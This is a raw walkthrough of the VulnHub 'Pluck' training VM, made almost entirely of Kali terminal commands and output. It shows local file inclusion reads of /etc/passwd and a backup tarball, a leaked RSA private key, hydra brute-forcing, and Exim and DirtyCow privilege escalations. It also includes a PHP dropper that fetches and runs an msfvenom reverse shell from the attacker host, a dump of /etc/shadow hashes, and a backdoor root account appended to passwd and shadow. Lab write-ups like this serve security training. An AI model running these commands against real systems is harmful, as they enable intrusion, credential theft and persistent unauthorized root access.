pluck
https://download.vulnhub.com/pluck/pluck.ova.zip

root@kali:~/Desktop# bash detailPortScan.sh 10.0.1.5
working on 10.0.1.5...
will be a while so relax ^^

unicornscan 10.0.1.5:1-65535
TCP: 22,80,3306,5355

nmap 10.0.1.5 -A -p 22,80,3306,5355

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-04-08 23:23 EDT
Nmap scan report for 10.0.1.5
Host is up (0.00039s latency).
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.3p1 Ubuntu 1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e8:87:ba:3e:d7:43:23:bf:4a:6b:9d:ae:63:14:ea:71 (RSA)
|_  256 8f:8c:ac:8d:e8:cc:f9:0e:89:f7:5d:a0:6c:28:56:fd (ECDSA)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Pluck
3306/tcp open  mysql   MySQL (unauthorized)
5355/tcp open  unknown
MAC Address: 08:00:27:45:29:54 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.4
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.39 ms 10.0.1.5

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 125.77 seconds

unicornscan -mU 10.0.1.5:1-65535
UDP: 51954

nmap 10.0.1.5 -sU -A -p 51954

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-04-08 23:29 EDT
Nmap scan report for 10.0.1.5
Host is up (0.00040s latency).
PORT      STATE  SERVICE VERSION
51954/udp closed unknown
MAC Address: 08:00:27:45:29:54 (Oracle VirtualBox virtual NIC)
Too many fingerprints match this host to give specific OS details
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.40 ms 10.0.1.5

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.54 seconds

view page source in http://10.0.1.5
found links to
<li><a href="index.php?page=about.php">About</a></li>
<li><a href="index.php?page=contact.php">Contact Us</a></li>

found LFI

http://10.0.1.5/index.php?page=/etc/lsb-release
DISTRIB_ID=Ubuntu DISTRIB_RELEASE=16.10 DISTRIB_CODENAME=yakkety DISTRIB_DESCRIPTION="Ubuntu 16.10" 

root@kali:~/Desktop# curl http://10.0.1.5/index.php?page=/etc/passwd
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:109::/var/run/dbus:/bin/false
mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
lxd:x:108:65534::/var/lib/lxd/:/bin/false
uuidd:x:109:114::/run/uuidd:/bin/false
dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:112:1::/var/cache/pollinate:/bin/false
bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
Debian-exim:x:113:119::/var/spool/exim4:/bin/false
peter:x:1001:1001:,,,:/home/peter:/bin/bash
paul:x:1002:1002:,,,:/home/paul:/usr/bin/pdmenu
backup-user:x:1003:1003:Just to make backups easier,,,:/backups:/usr/local/scripts/backup.sh

root@kali:~/Desktop# nikto -h http://10.0.1.5
+ OSVDB-29786: /admin.php?en_log_id=0&action=config: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
+ OSVDB-29786: /admin.php?en_log_id=0&action=users: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
+ OSVDB-3092: /admin.php: This might be interesting...
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.

admin login at
http://10.0.1.5/admin.php?
/admin.php?en_log_id=0&action=config
/admin.php?en_log_id=0&action=users

found sql injection in admin page email box but not exploitable
http://10.0.1.5/admin.php
root@kali:~/Desktop# curl -X POST http://10.0.1.5/admin.php -F "email=bob' or 1=1 or ';#&password=" | html2text

root@kali:~/Desktop# sqlmap -u http://10.0.1.5/admin.php --method POST --data "email=ee&password=pp" -p email,password --dbms=mysql
also say not exploitable

root@kali:~/Desktop# whatweb http://10.0.1.5
http://10.0.1.5 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.0.1.5], JQuery, Script, Title[Pluck], X-UA-Compatible[IE=edge]

root@kali:~/Desktop# cewl http://10.0.1.5/admin.php > ./pluck-admin.cewl
root@kali:~/Desktop# cewl http://10.0.1.5/index.php?page=about.php -m 6 > pluck-about.cewl

root@kali:~/Desktop# hydra -l admin@example.com -P ./pluck-admin.cewl 10.0.1.5 http-post-form "/admin.php:email=^USER^&password=^PASS^:F=Incorrect Username or Password!" -V

root@kali:~/Desktop# hydra -l admin@example.com -P ./pluck-about.cewl 10.0.1.5 http-post-form "/admin.php:email=^USER^&password=^PASS^:F=Incorrect Username or Password!" -V

root@kali:~/Desktop# for s in $(ls /usr/share/nmap/scripts/http-vuln-*);do nmap 10.0.1.5 -p 80 --script $s;done

Thanks to the lead found in backup-user' shell and LFI
backup-user:x:1003:1003:Just to make backups easier,,,:/backups:/usr/local/scripts/backup.sh

root@kali:~/Desktop# curl http://10.0.1.5/index.php?page=/usr/local/scripts/backup.sh | html2text
#!/bin/bash 
######################## # Server Backup script ######################### 
#Backup directories in /backups so we can get it via tftp 
echo "Backing up data" 
tar -cf /backups/backup.tar /home /var/www/html > /dev/null 2& > /dev/null 
echo "Backup complete"

root@kali:~/Desktop# curl http://10.0.1.5/index.php?page=/backups/backup.tar > backup.tar
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 6377M    0 6377M    0     0  46.0M      0 --:--:--  0:02:18 --:--:-- 54.7M
curl: (18) transfer closed with outstanding read data remaining
resulted in GBs of data downloaded

root@kali:~/Desktop# strings ./backup.tar | more

found pauls RSA private key

/home/paul/keys/id_key4

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAw2umEDHC4Hd6pW0kMHxlmRbKAimgx/qLTybuR8SzYibD49Pu
+ByG1KckHTvkPnIePACC3SFCNyb0f9C21XxwKYFH6Zfg+uKuIrtyWABmOXJyyuUt
XjtY84btJ8cC7lSqNKLzzClpDzmOphDkWLISrs7qK65pU9qUMZ/AztK+VYWnC6y4
hQEgPZcN3skg0BNW+PfkAtzJ4q1zHF8HZr2z89m8HJV5t6gHl3nNPL1eyeanAZvh
GSDldCZcx/ZUFERVj/Q3CYaE8JL6faOAwA56M9lRbSupFTbp/07g1xbFCKNMb/Io
GTtG8sGrGZrSlNTLIV90brgRqRoxcwdOnHGeLwIDAQABAoIBAF4uZmVNpi8KRiit
9hAME+b5DbiHGX7np/YovBQIn6+BIU2O2Y/oJ68bMpOIRtM1qo6ebHNoUQJFmvZy
v3saMvA950uUMBCZ6PTCRDRXVO0A1IQmeXv9vDv53hgamLYGRdWCZ18Q4ho9UhuE
7pg0kj5/aGpO72JDaMKVzJWhCawrGrsX8ONUK4nGLjeocVcdFoC/XcGMYe0uP3BN
Y35xLvbrq79NwK5v4dRpzw+mp5r+BHtw+MHlbHXkruwM5h99CXTCKWpGlRWDEC83
55pR6nNlNZ4dG0VtgjtCu2nXk/eDJA26XDjIMR2CyzpEWRzfAulta10vOLEMUhQJ
Z2lil+kCgYEA7eDhw3qK4yffgtjgI8gsuglEHyDkCG4YVjkKpqMabbXUeT9tRsJd
4NXejMpnjwNW1eGji6ylMC5VNUmZKZck8EqNMkQV6Az4e4U9ZS/LX+5mGww2zD+9
QrlyUq/DvTx6Ytu080JWKPSEyeGCVRIQDlURgnYyRv48AFQAvvTvB5UCgYEA0k6/
7zP3uhtNvS3IK7pfOGCl5asn29dRStbsDPVuHBINou8bFclMc3oU7hIUyD+0MFT5
S+z2yhms5s8RZ/RtuU57tadYeyN8n3xZcNoQJctTMGLto0qWeEgEjoFtz7Fz3SnA
MYwv0qRtAH8LDIYVHh7mp8N6X2C9DI5eqPwJzbMCgYEA2pGLvypEnS2Q4FBXumj+
N7212whEnj5SnD7zO2OYMAAnh3Sw+pgy3BiG0URU3QILcqBNvlPWwCuCXWEPmzhm
V2eYzvviSQJJ+mzVmbjNnIqXRPj3DLrwMnPkyHb5WlJMfbM0U2O7eQwbSserEnFz
UUf2u7HQxoxpI0AMI2k4i/UCgYAFWxYOPG+RoMJhD/pqCqwEHon7CFnSgnBCjKik
R9fPBTKttJMnAeJdin1f9rvqwZyQIonawiUiznaVxi42TIZC0tnZrXJWaHfzA9Kv
Sg5hOAVdVReiMfMVCxh6nJc0U9uUhUystlo9bgyMl6+rWPrOspDDMvo51Zfa6wFE
Im8JewKBgQCF1LDyOqxRkyJhQqavaVaAGpT6a28cPv3S3cUEp+zC8YvPn9g4XfDe
6UGiNYpLE87B9Dyx69GXdozFQAZcfriwlD81NqJdEjf0mE4Plt1F2jLnruHbjXRv
S30bXrr9FOgayKJpRfYUgSghubMbdDDM6YhSm3MyYyP4FXjm7keHoQ==
-----END RSA PRIVATE KEY-----

lets try logging in through ssh using pauls key
(paul default shell is pdmenu??)
paul:x:1002:1002:,,,:/home/paul:/usr/bin/pdmenu

root@kali:~/Desktop# ssh -i ./paul-rsa.private paul@10.0.1.5
logged into pdmenu 1.3.4

pdmenu allows edit file with vi and that means a legit shell

:set shell ?		--> to view current shell (/usr/bin/pdmenu)
:set shell=/bin/bash	--> to set default shell to /bin/bash
:shell			-->launch bash shell

root@kali:~/Desktop# ssh -i paul-rsa.private paul@10.0.1.5
Last login: Sun Apr  9 04:00:33 2017 from 10.0.1.2


priv esc

paul@pluck:/tmp$ find / -perm -4000 -ls 2>/dev/null
   153966   1024 -rwsr-xr-x   1 root     root      1046368 Jan 18 08:54 /usr/exim/bin/exim-4.84-7
      355     56 -rwsr-xr-x   1 root     root        54256 Sep 20  2016 /usr/bin/passwd
    21792     52 -rwsr-sr-x   1 daemon   daemon      51464 Jan 15  2016 /usr/bin/at
      344     40 -rwsr-xr-x   1 root     root        39904 Sep 20  2016 /usr/bin/newgrp
    22734     24 -rwsr-xr-x   1 root     root        22520 Oct  6  2016 /usr/bin/pkexec
      441    136 -rwsr-xr-x   1 root     root       136808 Aug 15  2016 /usr/bin/sudo
    21450     20 -rwsr-xr-x   1 root     root        18416 Jun 15  2016 /usr/bin/traceroute6.iputils
    22669     36 -rwsr-xr-x   1 root     root        32944 Sep 20  2016 /usr/bin/newuidmap
      190     72 -rwsr-xr-x   1 root     root        71824 Sep 20  2016 /usr/bin/chfn
      262     76 -rwsr-xr-x   1 root     root        75304 Sep 20  2016 /usr/bin/gpasswd
    22668     36 -rwsr-xr-x   1 root     root        32944 Sep 20  2016 /usr/bin/newgidmap
      192     40 -rwsr-xr-x   1 root     root        40432 Sep 20  2016 /usr/bin/chsh
     2222     44 -rwsr-xr--   1 root     messagebus    42992 Oct 12 14:29 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    22737     16 -rwsr-xr-x   1 root     root          14328 Oct  6  2016 /usr/lib/policykit-1/polkit-agent-helper-1
   277811     12 -rwsr-xr-x   1 root     root          10104 Jul  9  2016 /usr/lib/s-nail/s-nail-privsep
    21548    432 -rwsr-xr-x   1 root     root         440728 Aug  7  2016 /usr/lib/openssh/ssh-keysign
      561     12 -rwsr-xr-x   1 root     root          10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
   262239     40 -rwsr-xr-x   1 root     root          40128 Sep 20  2016 /bin/su
   262258     28 -rwsr-xr-x   1 root     root          26696 Sep 12  2016 /bin/umount
   262207     40 -rwsr-xr-x   1 root     root          38984 Sep 12  2016 /bin/mount
   274414     32 -rwsr-xr-x   1 root     root          30800 Aug 11  2016 /bin/fusermount
   262221     60 -rwsr-xr-x   1 root     root          60288 Jun 15  2016 /bin/ping
   274178    144 -rwsr-xr-x   1 root     root         146128 Apr 27  2016 /bin/ntfs-3g

exim-4.84-7 is set uid and seems to be vuln
Exim 4.84-3 - Privilege Escalation | ./linux/local/39535.sh

paul@pluck:/tmp$ wget http://10.0.1.2/39535.sh
--2017-04-09 04:48:38--  http://10.0.1.2/39535.sh
Connecting to 10.0.1.2:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 673 [text/x-sh]
Saving to: ‘39535.sh.2’

39535.sh.2                        100%[=============================================================>]     673  --.-KB/s    in 0s      

2017-04-09 04:48:38 (56.1 MB/s) - ‘39535.sh.2’ saved [673/673]

paul@pluck:/tmp$ /bin/sh ./39535.sh 
Exim is a Mail Transfer Agent. It is normally called by Mail User Agents,
not directly from a shell command line. Options and/or arguments control
what it does when called. For a list of options, see the Exim documentation.

the exploit will create root.pm file
paul@pluck:/tmp$ ls
39535.sh    39535.sh.2   rev-443  systemd-private-5940e051901948df8322f4be7838d868-systemd-timesyncd.service-7MIWu4
39535.sh.1  met-rev-443  root.pm
paul@pluck:/tmp$ PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim-4.84-7 -ps
# id
uid=0(root) gid=1002(paul) groups=1002(paul)
# 


another way to get shell
good this this shell can write to file so I create a php dropper /tmp/download-run-rev-443.php
<?php echo shell_exec("which wget");?>
<?php echo shell_exec("which chmod");?>
<?php echo shell_exec("/usr/bin/wget http://10.0.1.2/rev-443 -O /tmp/rev-443");?>
<?php echo shell_exec("/bin/chmod +x /tmp/rev-443");?>
<?php echo shell_exec("/tmp/rev-443 &");?>

drop a reverse shell into my web root
root@kali:~/Desktop/linuxRoot# msfvenom -p linux/x64/shell_reverse_tcp LPORT=443 LHOST=10.0.1.2 -f elf > /var/www/html/rev-443

start a listener
root@kali:~/Desktop#  nc -lnvp 443

trigger the dropper with
root@kali:~/Desktop# curl http://10.0.1.5/index.php?page=/tmp/download-run-rev-443.php | html2text 

root@kali:~/Desktop# nc -lnvp 443
listening on [any] 443 ...
connect to [10.0.1.2] from (UNKNOWN) [10.0.1.5] 49374
/bin/bash -i
bash: cannot set terminal process group (1013): Inappropriate ioctl for device
bash: no job control in this shell
www-data@pluck:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@pluck:/var/www/html$


another priv esc 
dirtyCow (86/64 version)
root@kali:~/Desktop/linuxRoot# gcc ./dirtyCow.c -pthread -o /var/www/html/dirtyCow

paul@pluck:/tmp$ wget http://10.0.1.3/dirtyCow
--2017-04-11 07:15:09--  http://10.0.1.3/dirtyCow
Connecting to 10.0.1.3:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 11384 (11K)
Saving to: ‘dirtyCow’

dirtyCow                          100%[=============================================================>]  11.12K  --.-KB/s    in 0s      

2017-04-11 07:15:09 (44.2 MB/s) - ‘dirtyCow’ saved [11384/11384]

paul@pluck:/tmp$ chmod +x ./dirtyCow
paul@pluck:/tmp$ ./dirtyCow 
DirtyCow root privilege escalation
Backing up /usr/bin/passwd.. to /tmp/bak
Size of binary: 54256
Racing, this may take a while..
thread stopped
/usr/bin/passwd is overwritten
Popping root shell.
Don't forget to restore /tmp/bak
thread stopped
root@pluck:/tmp#
root@pluck:/tmp# echo 0 > /proc/sys/vm/dirty_writeback_centisecs
****(immediately dirty_writeback_centisecs to avoid the VM crashes)

https://www.kernel.org/doc/Documentation/sysctl/vm.txt
dirty_writeback_centisecs

The kernel flusher threads will periodically wake up and write `old' data
out to disk.  This tunable expresses the interval between those wakeups, in
100'ths of a second.

Setting this to zero disables periodic writeback altogether.

root@pluck:/tmp# cat /etc/shadow
root:!:17184:0:99999:7:::
daemon:*:17086:0:99999:7:::
bin:*:17086:0:99999:7:::
sys:*:17086:0:99999:7:::
sync:*:17086:0:99999:7:::
games:*:17086:0:99999:7:::
man:*:17086:0:99999:7:::
lp:*:17086:0:99999:7:::
mail:*:17086:0:99999:7:::
news:*:17086:0:99999:7:::
uucp:*:17086:0:99999:7:::
proxy:*:17086:0:99999:7:::
www-data:*:17086:0:99999:7:::
backup:*:17086:0:99999:7:::
list:*:17086:0:99999:7:::
irc:*:17086:0:99999:7:::
gnats:*:17086:0:99999:7:::
nobody:*:17086:0:99999:7:::
systemd-timesync:*:17086:0:99999:7:::
systemd-network:*:17086:0:99999:7:::
systemd-resolve:*:17086:0:99999:7:::
systemd-bus-proxy:*:17086:0:99999:7:::
syslog:*:17086:0:99999:7:::
_apt:*:17086:0:99999:7:::
messagebus:*:17086:0:99999:7:::
mysql:!:17184:0:99999:7:::
lxd:*:17184:0:99999:7:::
uuidd:*:17184:0:99999:7:::
dnsmasq:*:17184:0:99999:7:::
sshd:*:17184:0:99999:7:::
pollinate:*:17184:0:99999:7:::
bob:$6$sYe2JQ/a$5cOQ7Ui9QeqOBRCtSkUBSbefd8543olgQduIz1udqq7TzZhomEQ/4V34zXjZCGao9FyiTdloA8bDDsIB3HY6z/:17185:0:99999:7:::
Debian-exim:!:17184:0:99999:7:::
peter:$6$fnL2ALnx$38/j6ZKBTIdiil5PpBFXPgWbhLUnNrPW6wEV3sU/ImbPBm35DfJgoxCpzVLHpMCS80lyXgUb3I9c4rEg3m90P.:17184:0:99999:7:::
paul:$6$NHKGL1ny$rLXuqN0JaNDXw2FQxdZknoojln3dKTgg7fTQwxmxMxFacR5DpguUSBlIlsH64Mc3nvmhBcVCJB2PQgCd4B8mI1:17184:0:99999:7:::
backup-user:$6$QPdAW3kj$/u1DHuRnjK7mSWNUjeCNrHo8gbKWP18hAwkESRICrNKXmeXiYZKgnysOIqg68A.aAFQK51fJ56iGR.EFeFyuP/:17184:0:99999:7:::

manual adding another root user 
not all linux allow empty passwd login i.e echo "stuff::0:0:just me:/tmp:/bin/bash" >> /etc/passwd
sleeper:Sleeper1234
echo "sleeper:x:0:0:just me:/tmp:/bin/bash" >> /etc/passwd
root@kali:~/Desktop# openssl passwd -1
Password: 
Verifying - Password: 
$1$OHPnoUxT$1IPpReu9PW02FFW5RbpkM/
echo 'sleeper:$1$OHPnoUxT$1IPpReu9PW02FFW5RbpkM/:17184:0:99999:7:::' >> /etc/shadow
